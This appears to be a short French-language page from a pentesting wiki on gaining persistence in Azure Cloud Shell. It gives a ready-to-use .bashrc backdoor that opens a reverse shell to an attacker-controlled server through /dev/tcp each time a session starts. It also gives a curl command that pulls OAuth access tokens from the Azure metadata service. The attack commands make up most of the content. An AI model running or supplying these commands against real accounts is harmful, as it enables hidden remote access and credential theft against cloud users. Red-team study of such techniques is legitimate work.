# Az - Cloud Shell Persistence

{{#include ../../../banners/hacktricks-training.md}}

## Cloud Shell Persistence

Azure Cloud Shell offre un accès en ligne de commande pour gérer les ressources Azure avec un stockage persistant et une authentification automatique. Les attaquants peuvent en profiter en plaçant des portes dérobées dans le répertoire personnel persistant :

* **Stockage Persistant** : Le répertoire personnel de Azure Cloud Shell est monté sur un partage de fichiers Azure et reste intact même après la fin de la session.
* **Scripts de Démarrage** : Des fichiers comme .bashrc s'exécutent automatiquement au début de chaque session, permettant une exécution persistante lorsque le cloud shell démarre.

Exemple de porte dérobée dans .bashrc :
```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/$CCSERVER/443 0>&1 &)' >> $HOME/.bashrc
```
Cette porte dérobée peut exécuter des commandes même 5 minutes après que le cloud shell a été terminé par l'utilisateur.

De plus, interrogez le service de métadonnées d'Azure pour obtenir des détails sur l'instance et des jetons :
```bash
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -s
```
{{#include ../../../banners/hacktricks-training.md}}
